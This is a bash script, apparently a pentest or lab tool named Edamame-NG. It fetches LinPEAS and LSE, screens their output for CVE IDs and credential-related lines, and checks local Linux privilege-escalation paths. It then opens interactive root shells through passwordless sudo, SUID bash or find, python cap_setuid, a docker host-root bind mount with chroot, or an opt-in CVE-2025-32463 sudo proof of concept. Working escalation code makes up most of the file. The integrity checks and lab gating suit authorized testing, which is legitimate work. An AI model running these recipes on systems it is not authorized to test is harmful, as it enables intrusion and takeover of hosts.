#!/usr/bin/env bash
# Edamame-NG: host-local Linux enumeration and verified privilege proof.
set -uo pipefail
umask 077

if [[ $(uname -s) != Linux ]]; then
  printf 'Edamame-NG Linux runner requires Linux.\n' >&2
  exit 2
fi

RUN_BASE="${HOME}/edamame-ng-runs"
CACHE_BASE="${XDG_CACHE_HOME:-${HOME}/.cache}/edamame-ng"
TOOL_DIR=''
MODE='auto'
RESUME_ID=''
NO_SHELL=0
VERBOSE=0
OFFLINE=0
FINISH_BG_ENUM=0
CATALOG_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/catalog"
CVE_QUERY=''
QUERY_MODES=0
POC_QUERY=0
CVE_DETAILS_QUERY=0
DETAILS_CATALOG_STATE=''
LAB_CVE_ENABLED=0
CVE_SUDO='/opt/edamame-vuln-sudo/bin/sudo'
CVE_SUDO_SHA='8c18093b760250d35b1ebcc5ecd12b33d17b8a2cfc27f170bbb4f62b674702cd'
CVE_POC_SHA='9826979c7a3cb1ca582862768d74245806051db5601c7b6a7e13bde93b8052d7'

usage() {
  cat <<'EOF'
Usage: edamame-ng.sh [--scan | --resume [RUN_ID]] [--output-dir DIR]
                      [--tool-dir DIR] [--catalog-dir DIR] [--offline]
                      [--finish-bg-enum] [--verbose] [--no-shell]
                      [--enable-cve-2025-32463-lab]
       edamame-ng.sh --cve CVE-YYYY-NNNN [--catalog-dir DIR]
       edamame-ng.sh --cve-details CVE-YYYY-NNNN [--catalog-dir DIR]
       edamame-ng.sh --poc CVE-YYYY-NNNN [--catalog-dir DIR]
Run with no mode to choose Resume (default) or Scan when a prior success exists.
--tool-dir accepts local assets only when each has an adjacent .sha256 file.
EOF
}

while (($#)); do
  case $1 in
    --scan) MODE=scan; shift ;;
    --resume) MODE=resume; shift; if (($#)) && [[ $1 != --* ]]; then RESUME_ID=$1; shift; fi ;;
    --output-dir) (($# >= 2)) || { usage >&2; exit 2; }; RUN_BASE=$2; shift 2 ;;
    --tool-dir) (($# >= 2)) || { usage >&2; exit 2; }; TOOL_DIR=$2; shift 2 ;;
    --catalog-dir) (($# >= 2)) || { usage >&2; exit 2; }; CATALOG_DIR=$2; shift 2 ;;
    --cve) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; QUERY_MODES=$((QUERY_MODES+1)); shift 2 ;;
    --cve-details) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; CVE_DETAILS_QUERY=1; QUERY_MODES=$((QUERY_MODES+1)); shift 2 ;;
    --poc) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; POC_QUERY=1; QUERY_MODES=$((QUERY_MODES+1)); shift 2 ;;
    --enable-cve-2025-32463-lab) LAB_CVE_ENABLED=1; shift ;;
    --no-shell) NO_SHELL=1; shift ;;
    --offline) OFFLINE=1; shift ;;
    --finish-bg-enum) FINISH_BG_ENUM=1; shift ;;
    -v|--verbose) VERBOSE=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) usage >&2; exit 2 ;;
  esac
done
if ((QUERY_MODES > 1)); then
  printf 'Choose one CVE query mode.\n' >&2
  exit 2
fi
CVE_POC="$CATALOG_DIR/pocs/CVE-2025-32463/sudo-chwoot.sh"
CVE_BASE="$CATALOG_DIR/local-eop.tsv"
[[ -f $CVE_BASE ]] || CVE_BASE=/dev/null
CVE_CURATED="$CATALOG_DIR/curated-eop.tsv"
[[ -f $CVE_CURATED ]] || CVE_CURATED=/dev/null

cve_lookup() {
  local id=$1 platform=$2 row state year
  row=$(awk -F '\t' -v id="$id" -v platform="$platform" 'FNR>1 && $1==id {
    status=($2==platform || platform=="any" ? "indexed-review-only" : "platform-mismatch")
    print $1 "\t" status "\t" $2 "\t" $3 "\t" $4 "\t" $5; exit}' \
    "$CVE_BASE" "$CVE_CURATED")
  if [[ -n $row ]]; then
    printf '%s\n' "$row"
    return
  fi
  year=${id:4:4}
  state=''
  if [[ -f $CATALOG_DIR/cve-ids/$year.tsv ]]; then
    state=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print $2; exit}' "$CATALOG_DIR/cve-ids/$year.tsv")
  fi
  [[ -n $state ]] && state="${state}-general" || state=unindexed
  printf '%s\t%s\t\t\t\thttps://www.cve.org/CVERecord?id=%s\n' "$id" "$state" "$id"
}

cve_details_lookup() {
  local id=$1 row state year review_state=not-in-local-details member
  member=''
  member=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print 1; exit}' "$CVE_BASE" "$CVE_CURATED")
  if [[ -n $member ]] && verify_details_catalog; then
    row=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print; exit}' "$CATALOG_DIR/local-eop-details.tsv")
    if [[ -n $row ]]; then printf '%s\n' "$row"; return; fi
  fi
  if [[ $DETAILS_CATALOG_STATE == invalid ]]; then review_state=integrity-failed; fi
  year=${id:4:4}
  state=''
  if [[ -f $CATALOG_DIR/cve-ids/$year.tsv ]]; then
    state=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print $2; exit}' "$CATALOG_DIR/cve-ids/$year.tsv")
  fi
  [[ -n $state ]] || state=unindexed
  printf '%s\t%s\t\t\t\t%s\n' "$id" "$state" "$review_state"
}

sha256_file() {
  local binary line digest
  for binary in /usr/bin/sha256sum /bin/sha256sum; do
    if [[ -x $binary ]]; then
      line=$("$binary" "$1") || return 1
      digest=${line%% *}
      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
      printf '%s\n' "$digest"
      return 0
    fi
  done
  for binary in /usr/bin/shasum /bin/shasum; do
    if [[ -x $binary ]]; then
      line=$("$binary" -a 256 "$1") || return 1
      digest=${line%% *}
      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
      printf '%s\n' "$digest"
      return 0
    fi
  done
  return 1
}

verify_details_catalog() {
  local index=$CATALOG_DIR/local-eop-details.tsv manifest=$CATALOG_DIR/local-eop-details-source.json
  local base=$CATALOG_DIR/cve-ids-source.json expected actual baseline index_baseline
  [[ $DETAILS_CATALOG_STATE == valid ]] && return 0
  [[ $DETAILS_CATALOG_STATE == invalid ]] && return 1
  [[ -f $index ]] || { DETAILS_CATALOG_STATE=absent; return 1; }
  DETAILS_CATALOG_STATE=invalid
  [[ ! -L $index && -f $manifest && ! -L $manifest && -f $base && ! -L $base ]] || return 1
  expected=$(sed -nE 's/^[[:space:]]*"details_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$manifest")
  baseline=$(sed -nE 's/^[[:space:]]*"baseline_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$manifest")
  index_baseline=$(sed -nE 's/^[[:space:]]*"baseline_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$base")
  [[ $expected =~ ^[0-9a-f]{64}$ && $baseline =~ ^[0-9a-f]{64}$ && $baseline == "$index_baseline" ]] || return 1
  actual=$(sha256_file "$index") || return 1
  [[ $actual == "$expected" ]] || return 1
  DETAILS_CATALOG_STATE=valid
}

trusted_root_file() {
  local path=$1 mode
  [[ $path == /* && -f $path ]] || return 1
  while [[ $path != / ]]; do
    [[ ! -L $path && $(/usr/bin/stat -c %u "$path" 2>/dev/null) == 0 ]] || return 1
    mode=$(/usr/bin/stat -c %a "$path" 2>/dev/null) || return 1
    [[ $mode =~ ^[0-7]+$ ]] || return 1
    (( (8#$mode & 8#22) == 0 )) || return 1
    path=${path%/*}
    [[ -n $path ]] || path=/
  done
}

if [[ -n $CVE_QUERY ]]; then
  [[ $CVE_QUERY =~ ^CVE-[0-9]{4}-[0-9]{4,}$ ]] || { printf 'Invalid CVE ID.\n' >&2; exit 2; }
  if ((POC_QUERY)); then
    [[ -f $CATALOG_DIR/poc_refs.tsv ]] || { printf 'Offline PoC manifest unavailable.\n' >&2; exit 2; }
    printf 'cve\tstatus\tsource\tpath\tsha256\treview_state\n'
    poc_found=0
    while IFS=$'\t' read -r id _kind source _commit relative digest _license state; do
      [[ $id == "$CVE_QUERY" ]] || continue
      poc_found=1
      if [[ $relative == - ]]; then
        printf '%s\treference-only\t%s\t\t\t%s\n' "$id" "$source" "$state"
        continue
      fi
      [[ $relative =~ ^pocs/CVE-[0-9]{4}-[0-9]{4,}/[A-Za-z0-9._-]+$ && $relative == "pocs/$CVE_QUERY/"* && $digest =~ ^[0-9a-f]{64}$ ]] || { printf 'Invalid PoC manifest entry.\n' >&2; exit 2; }
      asset="$CATALOG_DIR/$relative"
      [[ -f $asset && ! -L $asset && $(sha256_file "$asset") == "$digest" ]] || { printf 'PoC asset missing or digest mismatch.\n' >&2; exit 2; }
      printf '%s\tverified-bundle\t%s\t%s\t%s\t%s\n' "$id" "$source" "$asset" "$digest" "$state"
    done < <(tail -n +2 "$CATALOG_DIR/poc_refs.tsv")
    ((poc_found)) || printf '%s\tnot-indexed\t\t\t\t\n' "$CVE_QUERY"
  elif ((CVE_DETAILS_QUERY)); then
    if [[ -f $CATALOG_DIR/local-eop-details.tsv ]] && ! verify_details_catalog; then
      printf 'Offline CVE details failed integrity checks.\n' >&2
      exit 2
    fi
    printf 'cve\tstate\tdescription\taffected_json\treferences_json\treview_state\n'
    cve_details_lookup "$CVE_QUERY"
  else
    [[ $CVE_BASE != /dev/null || $CVE_CURATED != /dev/null ]] || { printf 'Offline catalog unavailable.\n' >&2; exit 2; }
    printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n'
    cve_lookup "$CVE_QUERY" any
  fi
  exit 0
fi

cat <<'EOF'
   _____    _                                   _   _  _____
  | ____|__| | __ _ _ __ ___   __ _ _ __ ___   | \ | |/ ____|
  |  _| / _` |/ _` | '_ ` _ \ / _` | '_ ` _ \  |  \| | |  __
  | |__| (_| | (_| | | | | | | (_| | | | | | | | |\  | |__| |
  |_____\__,_|\__,_|_| |_| |_|\__,_|_| |_| |_| |_| \_|\_____|
                      Edamame-NG  /  Linux
EOF

safe_name() { [[ $1 =~ ^[A-Za-z0-9._+-]+$ && $1 != . && $1 != .. ]]; }
host_name=$(hostname -s 2>/dev/null || hostname)
host_name=${host_name//[^A-Za-z0-9._-]/_}

if [[ -L $RUN_BASE || -L $CACHE_BASE ]]; then
  printf 'Run and cache directories must not be symbolic links.\n' >&2
  exit 2
fi

latest_success() {
  [[ -d $RUN_BASE ]] || return 1
  find "$RUN_BASE" -mindepth 2 -maxdepth 2 -name success.tsv -type f -print 2>/dev/null |
    sort -r | while IFS= read -r candidate; do
      IFS=$'\t' read -r candidate_host _ < "$candidate"
      if [[ $candidate_host == "$host_name" ]]; then
        printf '%s\n' "$candidate"
        break
      fi
    done
}

if [[ $MODE == auto ]]; then
  prior=$(latest_success || true)
  if [[ -n $prior ]]; then
    if [[ -t 0 ]]; then
      read -r -p "Prior success found. [R]esume (default) or [S]can? " choice
      [[ $choice == [sS]* ]] && MODE=scan || MODE=resume
    else
      MODE=resume
    fi
  else
    MODE=scan
  fi
fi

if ((VERBOSE)) && [[ $MODE == scan ]]; then
  printf '[WARN] Verbose displays raw enumerator output, including possible credentials, on this console.\n' >&2
fi

success_file=''
if [[ $MODE == resume ]]; then
  if [[ -n $RESUME_ID ]]; then
    safe_name "$RESUME_ID" || { printf 'Invalid run ID.\n' >&2; exit 2; }
    success_file="$RUN_BASE/$RESUME_ID/success.tsv"
  else
    success_file=$(latest_success || true)
  fi
  [[ -n $success_file && -f $success_file && ! -L $success_file && ! -L ${success_file%/success.tsv} ]] || {
    printf 'No valid successful run to resume.\n' >&2; exit 2;
  }
  IFS=$'\t' read -r saved_host recipe _ < "$success_file"
  [[ $saved_host == "$host_name" ]] || { printf 'Saved run belongs to another host.\n' >&2; exit 2; }
  case $recipe in
    already-root|sudo-shell|suid-bash|suid-find|python-cap-setuid|docker-host-root|cve-2025-32463-lab) ;;
    *) printf 'Unknown saved recipe.\n' >&2; exit 2 ;;
  esac
  if [[ $recipe == cve-2025-32463-lab ]] && (( ! LAB_CVE_ENABLED )); then
    printf 'Saved CVE recipe requires --enable-cve-2025-32463-lab.\n' >&2
    exit 2
  fi
  printf '[RESUME] %s on %s; checking prerequisites again.\n' "$recipe" "$host_name"
  RUN_DIR=${success_file%/success.tsv}
else
  mkdir -p "$RUN_BASE" "$CACHE_BASE" || exit 2
  chmod 700 "$RUN_BASE" "$CACHE_BASE" || exit 2
  run_id="$(date -u +%Y%m%dT%H%M%SZ)-${host_name}-$$"
  RUN_DIR="$RUN_BASE/$run_id"
  mkdir -m 700 "$RUN_DIR" "$RUN_DIR/.capture" || exit 2
  : > "$RUN_DIR/tools.tsv"
  : > "$RUN_DIR/findings.tsv"
  : > "$RUN_DIR/attempts.tsv"
  : > "$RUN_DIR/coverage.tsv"
  printf '[RUN] %s\n' "$RUN_DIR"
fi

record_attempt() {
  printf '%s\t%s\t%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" "$2" >> "$RUN_DIR/attempts.tsv"
}

record_finding() {
  local category=$1 detail=$2
  printf '%s\t%s\n' "$category" "$detail" >> "$RUN_DIR/findings.tsv"
  printf '[FOUND] %s: %s\n' "$category" "$detail"
}

asset_from_release() {
  local repo=$1 asset=$2 dest=$3 tag expected url html actual cache_dir cached
  cache_dir="$CACHE_BASE/${repo//\//_}"
  mkdir -p "$cache_dir"
  chmod 700 "$cache_dir"
  cached="$cache_dir/$asset"
  if [[ -n $TOOL_DIR ]]; then
    if [[ -f $TOOL_DIR/$asset && -f $TOOL_DIR/$asset.sha256 ]]; then
      expected=$(awk 'NR==1 {print $1}' "$TOOL_DIR/$asset.sha256" | tr '[:upper:]' '[:lower:]')
      actual=$(sha256_file "$TOOL_DIR/$asset")
      if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
        cp "$TOOL_DIR/$asset" "$dest"
        printf '%s\tlocal\t%s\t%s\n' "$asset" "$TOOL_DIR/$asset" "$actual" >> "$RUN_DIR/tools.tsv"
        return 0
      fi
    fi
    printf '[WARN] Local %s is missing or its checksum failed.\n' "$asset" >&2
  elif (( ! OFFLINE )); then
    url=$(curl -fsSLI --connect-timeout 5 --max-time 20 -o /dev/null -w '%{url_effective}' "https://github.com/$repo/releases/latest" 2>/dev/null || true)
    tag=${url##*/}
    if safe_name "$tag" && [[ $url == "https://github.com/$repo/releases/tag/"* ]]; then
      html="$RUN_DIR/.capture/${asset}.release.html"
      if curl -fsSL --connect-timeout 5 --max-time 25 "https://github.com/$repo/releases/expanded_assets/$tag" -o "$html" 2>/dev/null; then
        expected=$(awk -v n="$asset" 'index($0,"digest for " n "\"") {if (match($0,/sha256:[a-f0-9]{64}/)) {print substr($0,RSTART+7,64); exit}}' "$html")
        if [[ -z $expected && $repo == diego-treitos/linux-smart-enumeration && $asset == lse.sh ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            cp "$dest" "$cached"
            printf '%s\n' "$actual" > "$cached.sha256"
            printf '%s\t%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" legacy-release-no-published-digest >> "$RUN_DIR/tools.tsv"
            printf '[WARN] %s release publishes no SHA-256; recorded download digest for cache checks.\n' "$asset" >&2
            return 0
          fi
        fi
        if [[ $expected =~ ^[a-f0-9]{64}$ ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            if [[ $actual == "$expected" ]]; then
              cp "$dest" "$cached"
              printf '%s\n' "$expected" > "$cached.sha256"
              printf '%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" >> "$RUN_DIR/tools.tsv"
              return 0
            fi
            rm -f "$dest"
            printf '[WARN] %s digest mismatch.\n' "$asset" >&2
          fi
        fi
      fi
    fi
    printf '[WARN] Current %s unavailable; checking verified cache.\n' "$asset" >&2
  else
    printf '[OFFLINE] Checking verified cache for %s.\n' "$asset"
  fi
  if [[ -f $cached && -f $cached.sha256 ]]; then
    expected=$(awk 'NR==1 {print $1}' "$cached.sha256" | tr '[:upper:]' '[:lower:]')
    actual=$(sha256_file "$cached")
    if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
      cp "$cached" "$dest"
      printf '%s\tcache\t%s\t%s\n' "$asset" "$cached" "$actual" >> "$RUN_DIR/tools.tsv"
      return 0
    fi
  fi
  printf '%s\tmissing\t-\t-\n' "$asset" >> "$RUN_DIR/tools.tsv"
  return 1
}

verify_recipe() {
  local recipe=$1 py caps image probe version cve_dir finder
  case $recipe in
    already-root) [[ $EUID == 0 ]] ;;
    sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$EUID" = 0' >/dev/null 2>&1 ;;
    suid-bash)
      [[ -u /bin/bash && $(stat -Lc %u /bin/bash 2>/dev/null) == 0 ]] &&
        /bin/bash -p -c 'test "$EUID" = 0' >/dev/null 2>&1
      ;;
    suid-find)
      for finder in /usr/bin/find /bin/find; do
        [[ -x $finder && -u $finder && $(stat -Lc %u "$finder" 2>/dev/null) == 0 ]] || continue
        probe=$("$finder" /dev/null -exec /bin/bash -p -c 'printf "uid=%s\n" "$EUID"' \; 2>/dev/null) || continue
        if [[ $probe == uid=0 ]]; then SUID_FIND_PATH=$finder; return 0; fi
      done
      return 1
      ;;
    python-cap-setuid)
      py=$(command -v python3 || true)
      [[ -n $py ]] && command -v getcap >/dev/null 2>&1 || return 1
      caps=$(getcap "$py" 2>/dev/null)
      [[ $caps == *cap_setuid* ]] && "$py" -c 'import os; os.setuid(0); assert os.getuid()==0' >/dev/null 2>&1
      ;;
    docker-host-root)
      command -v docker >/dev/null 2>&1 || return 1
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      [[ -n $image ]] || return 1
      timeout 30 docker run --rm --pull never --network none --entrypoint /bin/sh -v /:/host:ro "$image" -c 'chroot /host /bin/sh -c "test \"\$(id -u)\" = 0"' >/dev/null 2>&1
      ;;
    cve-2025-32463-lab)
      ((LAB_CVE_ENABLED)) || return 1
      [[ -x /usr/bin/stat && -x /usr/bin/timeout && -x /usr/bin/gcc ]] || return 1
      cve_dir=${CVE_SUDO%/*}
      trusted_root_file "$CVE_SUDO" && [[ -u $CVE_SUDO ]] || return 1
      trusted_root_file "$CVE_POC" || return 1
      [[ $(sha256_file "$CVE_SUDO") == "$CVE_SUDO_SHA" ]] || return 1
      version=$("$CVE_SUDO" -V 2>/dev/null) || return 1
      [[ ${version%%$'\n'*} == 'Sudo version 1.9.16p2' ]] || return 1
      [[ $(sha256_file "$CVE_POC") == "$CVE_POC_SHA" ]] || return 1
      probe=$(PATH="$cve_dir:/usr/sbin:/usr/bin:/sbin:/bin" /usr/bin/timeout 30 /bin/bash "$CVE_POC" --probe 2>&1) || return 1
      printf '%s\n' "$probe" | /usr/bin/grep -qx '0'
      ;;
    *) return 1 ;;
  esac
}

open_shell() {
  local recipe=$1 image py
  if ((NO_SHELL)); then
    printf '[PROOF] %s verified. Shell suppressed by --no-shell.\n' "$recipe"
    return 0
  fi
  [[ -t 0 && -t 1 ]] || { printf '[WARN] Interactive TTY required for elevated shell. Resume from a terminal.\n' >&2; return 0; }
  printf '[SHELL] %s. Exit to return to Edamame-NG.\n' "$recipe"
  case $recipe in
    already-root) /bin/bash -i ;;
    sudo-shell) sudo -n /bin/bash -i ;;
    suid-bash) /bin/bash -p -i ;;
    suid-find) "$SUID_FIND_PATH" /dev/null -exec /bin/bash -p -i \; ;;
    python-cap-setuid)
      py=$(command -v python3)
      "$py" -c 'import os; os.setuid(0); os.execv("/bin/bash",["/bin/bash","-i"])'
      ;;
    docker-host-root)
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      docker run --rm -it --pull never --network none --entrypoint /bin/sh -v /:/host:rw "$image" -c 'chroot /host /bin/bash -i'
      ;;
    cve-2025-32463-lab)
      PATH="${CVE_SUDO%/*}:/usr/sbin:/usr/bin:/sbin:/bin" /bin/bash "$CVE_POC" --shell
      ;;
  esac
}

if [[ $MODE == resume ]]; then
  if verify_recipe "$recipe"; then
    record_attempt "$recipe" resumed-proof
    open_shell "$recipe"
    exit 0
  fi
  record_attempt "$recipe" resume-prerequisite-failed
  printf '[WARN] Saved recipe no longer works. Use --scan.\n' >&2
  exit 1
fi

if [[ -n $TOOL_DIR ]]; then
  printf '[ENUM] Loading verified local assets.\n'
elif ((OFFLINE)); then
  printf '[OFFLINE] Using verified cached assets; release downloads are disabled.\n'
else
  printf '[ENUM] Fetching official current release assets.\n'
fi
linpeas="$RUN_DIR/.capture/linpeas.sh"
lse="$RUN_DIR/.capture/lse.sh"
have_linpeas=0; have_lse=0
linpeas_complete=0; lse_complete=0
asset_from_release peass-ng/PEASS-ng linpeas.sh "$linpeas" && have_linpeas=1
asset_from_release diego-treitos/linux-smart-enumeration lse.sh "$lse" && have_lse=1

linpeas_pid=''; lse_pid=''
if ((have_linpeas)); then
  printf '[ENUM] LinPEAS\n'
  timeout 600 bash "$linpeas" > "$RUN_DIR/.capture/linpeas-output.txt" 2>&1 &
  linpeas_pid=$!
fi
if ((have_lse)); then
  printf '[ENUM] LSE\n'
  timeout 600 bash "$lse" -i -l2 -c > "$RUN_DIR/.capture/lse-output.txt" 2>&1 &
  lse_pid=$!
fi

# Only new bytes are screened. A 64-byte overlap catches a CVE split across
# writes without rereading a potentially large PEAS capture on every poll.
cve_tmp="$RUN_DIR/.capture/cve-candidates.txt"
: > "$cve_tmp"
linpeas_offset=0; lse_offset=0; last_cve_count=0
screen_live_output() {
  local label file offset size start delta count
  for label in linpeas lse; do
    file="$RUN_DIR/.capture/$label-output.txt"
    [[ -f $file ]] || continue
    if [[ $label == linpeas ]]; then offset=$linpeas_offset; else offset=$lse_offset; fi
    size=$(wc -c < "$file" | tr -d ' ')
    ((size > offset)) || continue
    start=$((offset > 64 ? offset - 63 : 1))
    delta="$RUN_DIR/.capture/$label.delta"
    tail -c +"$start" "$file" > "$delta"
    if ((VERBOSE)); then tail -c +$((offset-start+2)) "$delta"; fi
    grep -aoE 'CVE-[0-9]{4}-[0-9]{4,}' "$delta" >> "$cve_tmp" || true
    if [[ $label == linpeas ]]; then linpeas_offset=$size; else lse_offset=$size; fi
  done
  count=$(sort -u "$cve_tmp" | wc -l | tr -d ' ')
  if ((count > last_cve_count)); then
    record_finding cve-candidates "$count suggested so far; review package/build status"
    last_cve_count=$count
  fi
}

printf '[ENUM] Verifying local escalation paths.\n'
if command -v sudo >/dev/null 2>&1; then
  # shellcheck disable=SC2024 # The current user owns this capture file.
  sudo -n -l > "$RUN_DIR/.capture/sudo-list.txt" 2>&1 || true
fi
if command -v getcap >/dev/null 2>&1; then
  getcap -r /usr/bin /bin 2>/dev/null > "$RUN_DIR/.capture/capabilities.txt" || true
fi
find /usr/bin /bin -maxdepth 1 -perm -4000 -type f 2>/dev/null > "$RUN_DIR/.capture/suid-files.txt" || true

selected=''
shell_opened=0
candidates=(already-root sudo-shell suid-bash suid-find python-cap-setuid docker-host-root)
if ((LAB_CVE_ENABLED)); then candidates+=(cve-2025-32463-lab); fi
for candidate in "${candidates[@]}"; do
  if verify_recipe "$candidate"; then
    selected=$candidate
    record_finding local-escalation "$candidate independently verified"
    record_attempt "$candidate" proof-success
    break
  fi
  record_attempt "$candidate" prerequisite-not-met
done
if [[ -n $selected && $NO_SHELL == 0 ]]; then
  if ((FINISH_BG_ENUM)); then
    printf '[ENUM] Enumerators continue while the shell is open. Final files are saved when it exits.\n'
    early_evidence=verified-local-proof
    if [[ $selected == cve-2025-32463-lab ]]; then
      early_evidence="uid0-probe,sudo-sha256:$CVE_SUDO_SHA,poc-sha256:$CVE_POC_SHA"
    fi
    printf '%s\t%s\t%s\n' "$host_name" "$selected" "$early_evidence" > "$RUN_DIR/success.tsv"
    open_shell "$selected"
    shell_opened=1
  else
    [[ -n $linpeas_pid ]] && kill "$linpeas_pid" 2>/dev/null || true
    [[ -n $lse_pid ]] && kill "$lse_pid" 2>/dev/null || true
    printf '[ENUM] Stopping remaining enumerators after verified proof.\n'
  fi
fi

while :; do
  screen_live_output
  active=0
  [[ -n $linpeas_pid ]] && kill -0 "$linpeas_pid" 2>/dev/null && active=1
  [[ -n $lse_pid ]] && kill -0 "$lse_pid" 2>/dev/null && active=1
  ((active)) || break
  sleep 0.2
done
screen_live_output
if [[ -n $linpeas_pid ]]; then
  if wait "$linpeas_pid"; then linpeas_complete=1; fi
  printf 'linpeas\t%s\n' "$( ((linpeas_complete)) && printf checked || printf partial )" >> "$RUN_DIR/coverage.tsv"
else
  printf 'linpeas\tunavailable\n' >> "$RUN_DIR/coverage.tsv"
fi
if [[ -n $lse_pid ]]; then
  if wait "$lse_pid"; then lse_complete=1; fi
  printf 'lse\t%s\n' "$( ((lse_complete)) && printf checked || printf partial )" >> "$RUN_DIR/coverage.tsv"
else
  printf 'lse\tunavailable\n' >> "$RUN_DIR/coverage.tsv"
fi
for label in linpeas lse; do
  output="$RUN_DIR/.capture/$label-output.txt"
  if [[ -f $output ]]; then
    count=$(grep -aEic 'writ(e|able)|password|credential|suid|cap_setuid|sudo|CVE-' "$output" || true)
    record_finding "$label-screening" "$count candidate lines in raw output; values withheld from console"
  fi
done
sort -u "$cve_tmp" -o "$cve_tmp"
if [[ $selected == cve-2025-32463-lab ]]; then
  printf 'CVE-2025-32463 tested lab build\tchecked\texact sudo and PoC digests plus UID 0 probe\n' >> "$RUN_DIR/coverage.tsv"
elif (( ! LAB_CVE_ENABLED )); then
  printf 'CVE-2025-32463 tested lab build\tunsupported\texplicit lab opt-in not supplied\n' >> "$RUN_DIR/coverage.tsv"
else
  printf 'CVE-2025-32463 tested lab build\tinapplicable\texact reviewed build not detected\n' >> "$RUN_DIR/coverage.tsv"
fi
enum_status=unsupported
if ((linpeas_complete && lse_complete)); then enum_status=checked; fi
while IFS='|' read -r area basis; do
  [[ -n $area ]] && printf '%s\t%s\t%s\n' "$area" "$enum_status" "$basis" >> "$RUN_DIR/coverage.tsv"
done <<'EOF'
Situational Awareness and Initial Enumeration|enumerator output
Check OS version, hostname, IP and distribution.|enumerator output
User and Sudoers Enumeration|enumerator output plus native sudo check
Startup scripts|enumerator output
History and backups|enumerator output
Sudoers|enumerator output plus native sudo check
Installed Applications|enumerator output
Drive Configuration|enumerator output
Service Enum|enumerator output
Docker / LXC Enum|enumerator output; Docker proof recorded separately
Running Processes|enumerator output
Network & WiFi Enumeration|local host output only
Cronjobs & Scheduled Tasks|enumerator output; no task change
Common Privilege Escalation Methods|enumerator output; named recipes recorded separately
SUID / SGID binaries|enumerator output; native bash and find proofs recorded separately
Writable files & directories|enumerator output; no file change
Passwords & sensitive files|enumerator output; values only in protected raw files
Interesting Files|enumerator output
Databases|passive enumeration only; no authentication
MYSQL / MariaDB|passive enumeration only; no authentication
POSTGRESQL|passive enumeration only; no authentication
SQLite / SQLite3|passive enumeration only; no authentication
Redis (redis-cli)|passive enumeration only; no authentication
MongoDB|passive enumeration only; no authentication
Automated Privilege Escalation Tools|LinPEAS and LSE
EOF
if [[ $selected == docker-host-root ]]; then
  printf 'Docker Escape\tchecked\tread-only host bind probe returned UID 0\n' >> "$RUN_DIR/coverage.tsv"
else
  printf 'Docker Escape\tunsupported\tno independent Docker escape proof in this run\n' >> "$RUN_DIR/coverage.tsv"
fi
printf 'Kernel & exploit checks\tunsupported\tCVE text is a review lead, not build or patch proof\nEnvironment abuse\tunsupported\tno independent privilege proof\nPath abuse\tunsupported\tno independent privilege proof\n' >> "$RUN_DIR/coverage.tsv"
# shellcheck disable=SC1112 # Preserve the checklist heading verbatim.
printf 'Dump clear PSK keys from the Network Manager if available.\tunsupported\tno cleartext value extraction\nCheck for tasks that are run as root and are world writeable.\tunsupported\timpactful change needs a reviewed recipe\nRev Shell’s\tinapplicable\ttool opens a local shell\nRed Teaming Toolkit\tunsupported\ttool-specific checklist entry\nBeRoot\tunsupported\ttool-specific checklist entry\n' >> "$RUN_DIR/coverage.tsv"
printf 'CVE build and patch applicability\tunsupported\toffline index is a review lead, not a vulnerable-build test\n' >> "$RUN_DIR/coverage.tsv"

# The visible alerts above precede these final output filenames.
for label in linpeas lse; do
  if [[ -f $RUN_DIR/.capture/$label-output.txt ]]; then
    mv "$RUN_DIR/.capture/$label-output.txt" "$RUN_DIR/$label-output.txt"
    printf '[SAVED] %s-output.txt\n' "$label"
  fi
done
while IFS= read -r cve; do
  [[ -n $cve ]] && printf '%s\thttps://www.cve.org/CVERecord?id=%s\n' "$cve" "$cve"
done < "$cve_tmp" > "$RUN_DIR/cve-candidates.tsv"
printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n' > "$RUN_DIR/cve-index.tsv"
if [[ $CVE_BASE == /dev/null && $CVE_CURATED == /dev/null ]]; then
  printf '[WARN] Offline CVE catalog unavailable; retaining CVE.org links.\n' >&2
fi
while IFS= read -r cve; do
  [[ -n $cve ]] && cve_lookup "$cve" linux >> "$RUN_DIR/cve-index.tsv"
done < "$cve_tmp"
printf 'cve\tstate\tdescription\taffected_json\treferences_json\treview_state\n' > "$RUN_DIR/cve-details.tsv"
if [[ -f $CATALOG_DIR/local-eop-details.tsv ]] && ! verify_details_catalog; then
  printf '[WARN] Offline CVE details failed integrity checks; withholding details.\n' >&2
fi
while IFS= read -r cve; do
  [[ -n $cve ]] && cve_details_lookup "$cve" >> "$RUN_DIR/cve-details.tsv"
done < "$cve_tmp"
